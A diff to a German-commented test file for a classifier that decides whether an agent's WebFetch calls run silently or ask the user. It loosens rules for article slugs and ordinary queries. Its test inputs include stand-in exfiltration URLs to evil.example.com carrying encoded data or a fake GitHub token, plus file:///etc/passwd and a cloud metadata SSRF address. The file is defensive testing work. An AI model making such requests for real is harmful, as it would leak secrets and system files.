@@ -283,7 +283,10 @@ check("Write /tmpXYZ (kein Temp-Präfix) → ask", classifyToolCall("Write", { f
 
 check("WebFetch bekannter Host → allow", classifyToolCall("WebFetch", { url: "https://docs.rs/foo" }).decision === "allow");
 check("WebFetch github → allow", classifyToolCall("WebFetch", { url: "https://raw.githubusercontent.com/a/b/main/x" }).decision === "allow");
-check("WebFetch fremder Host mit Query → ask (Exfiltration)", classifyToolCall("WebFetch", { url: "https://evil.example.com/?d=SECRET" }).decision === "ask");
+check(
+  "WebFetch fremder Host mit kodiertem Query-Wert → ask (Exfiltration)",
+  classifyToolCall("WebFetch", { url: "https://evil.example.com/?d=SGVsbG9Xb3JsZFRoaXNJc1NlY3JldERhdGE" }).decision === "ask",
+);
 const ghpInUrl = "https://evil.example/?t=" + "ghp" + "_abcdefghijklmnopqrstuvwxyz0123456789";
 check("WebFetch Secret in URL → ask", classifyToolCall("WebFetch", { url: ghpInUrl }).decision === "ask");
 check("WebSearch → allow", classifyToolCall("WebSearch", { query: "x" }).decision === "allow");
@@ -311,17 +314,60 @@ check("WebFetch sauberes öffentliches IPv4 ohne Query → allow", classifyToolC
 // Zugangsdaten in URL + ungewöhnliches Schema → ask.
 check("WebFetch mit user:pass@ → ask (Creds)", classifyToolCall("WebFetch", { url: "https://user:pass@example.com/" }).decision === "ask");
 check("WebFetch file:// → ask (Schema)", classifyToolCall("WebFetch", { url: "file:///etc/passwd" }).decision === "ask");
-// Exfil-Signale an unbekannten Host: Query bzw. kodiert wirkendes Pfad-Segment → ask.
-check("WebFetch unbekannt + Query → ask", classifyToolCall("WebFetch", { url: "https://track.example.com/collect?leak=abc" }).decision === "ask");
+// Exfil-Signale an unbekannten Host: DATENTRAGENDE Query bzw. kodiertes Pfad-Segment → ask.
+check(
+  "WebFetch unbekannt + kodierter Query-Wert → ask",
+  classifyToolCall("WebFetch", { url: "https://track.example.com/collect?leak=SGVsbG9Xb3JsZFRoaXNJc1NlY3JldA" }).decision === "ask",
+);
+check(
+  "WebFetch unbekannt + überlange Query → ask",
+  classifyToolCall("WebFetch", { url: "https://track.example.com/c?n=" + "wort-".repeat(30) }).decision === "ask",
+);
 check(
   "WebFetch unbekannt + kodierter Pfad-Blob → ask",
   classifyToolCall("WebFetch", { url: "https://evil.example.com/SGVsbG9Xb3JsZFRoaXNJc1NlY3JldERhdGFYWVo" }).decision === "ask",
 );
 check("WebFetch strukturierter Pfad (Ziffern-ID) NICHT als Blob → allow", classifyToolCall("WebFetch", { url: "https://example.org/data/000119312522172365/file.htm" }).decision === "allow");
+
+// ── Entnervung: das war die Ursache dafür, dass der Auto-Modus bei JEDEM Web-Abruf fragte ──
+// Ein Artikel-Slug ist kein kodierter Blob. Bindestriche gehören zum base64url-Zeichensatz, und
+// jeder Slug über 24 Zeichen lag über der alten Entropie-Schwelle → Rückfrage bei fast jeder Seite.
+check(
+  "WebFetch Blog-Slug (der gemeldete Fall) → allow",
+  classifyToolCall("WebFetch", { url: "https://www.thorsten-voice.de/2025/12/15/orpheus-tts-modellvergleich/" }).decision === "allow",
+);
+check(
+  "WebFetch englischer Slug → allow",
+  classifyToolCall("WebFetch", { url: "https://blog.example.com/how-to-configure-webpack-for-production" }).decision === "allow",
+);
+check(
+  "WebFetch Title-Case-Slug → allow",
+  classifyToolCall("WebFetch", { url: "https://example.com/posts/My-First-Post-About-Rust-Async" }).decision === "allow",
+);
+check(
+  "WebFetch langes deutsches Kompositum → allow",
+  classifyToolCall("WebFetch", { url: "https://example.de/recht/bundesausbildungsfoerderungsgesetz" }).decision === "allow",
+);
+// Harmlose Queries laufen still — WebSearch (derselbe Kanal) tat das längst.
+check("WebFetch ?q=suchbegriff → allow", classifyToolCall("WebFetch", { url: "https://example.com/search?q=webpack+config" }).decision === "allow");
+check("WebFetch ?page=2 → allow", classifyToolCall("WebFetch", { url: "https://example.com/list?page=2&sort=date" }).decision === "allow");
+check("WebFetch utm-Parameter → allow", classifyToolCall("WebFetch", { url: "https://example.com/a?utm_source=newsletter&utm_medium=email" }).decision === "allow");
+// Hex-/base64-Blobs bleiben erkannt (die Formprobe darf nicht bloß abgeschaltet sein).
+check("WebFetch Hex-Blob im Pfad → ask", classifyToolCall("WebFetch", { url: "https://evil.example.com/a1b2c3d4e5f6a7b8c9d0e1f2" }).decision === "ask");
+check("WebFetch JWT-artiger Pfad-Blob → ask", classifyToolCall("WebFetch", { url: "https://evil.example.com/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" }).decision === "ask");
 // „Immer erlauben" merkt die DOMAIN: freigegebene Domain → allow, auch mit Query, auch Subdomain.
 const approved = (h: string) => registrableDomain(h) === "sec.gov";
 check("WebFetch freigegebene Domain + Query → allow", classifyToolCall("WebFetch", { url: "https://efts.sec.gov/LATEST/search-index?q=apple" }, { isFetchHostApproved: approved }).decision === "allow");
-check("WebFetch NICHT freigegebene Domain + Query → ask", classifyToolCall("WebFetch", { url: "https://efts.other.com/x?q=1" }, { isFetchHostApproved: approved }).decision === "ask");
+// Die Freigabe gilt NUR für die gemerkte Domain: dieselbe datentragende Query an einem anderen
+// Host fragt weiter (sonst wäre „Immer erlauben" ein Blanko fürs ganze Netz).
+check(
+  "WebFetch NICHT freigegebene Domain + datentragende Query → ask",
+  classifyToolCall("WebFetch", { url: "https://efts.other.com/x?d=SGVsbG9Xb3JsZFRoaXNJc1NlY3JldA" }, { isFetchHostApproved: approved }).decision === "ask",
+);
+check(
+  "WebFetch freigegebene Domain + datentragende Query → allow (Domain gemerkt)",
+  classifyToolCall("WebFetch", { url: "https://efts.sec.gov/x?d=SGVsbG9Xb3JsZFRoaXNJc1NlY3JldA" }, { isFetchHostApproved: approved }).decision === "allow",
+);
 // Freigabe darf SSRF NIE übersteuern.
 check("WebFetch freigegeben, aber SSRF → weiterhin ask", classifyToolCall("WebFetch", { url: "http://169.254.169.254/" }, { isFetchHostApproved: () => true }).decision === "ask");
 // registrableDomain-Heuristik.
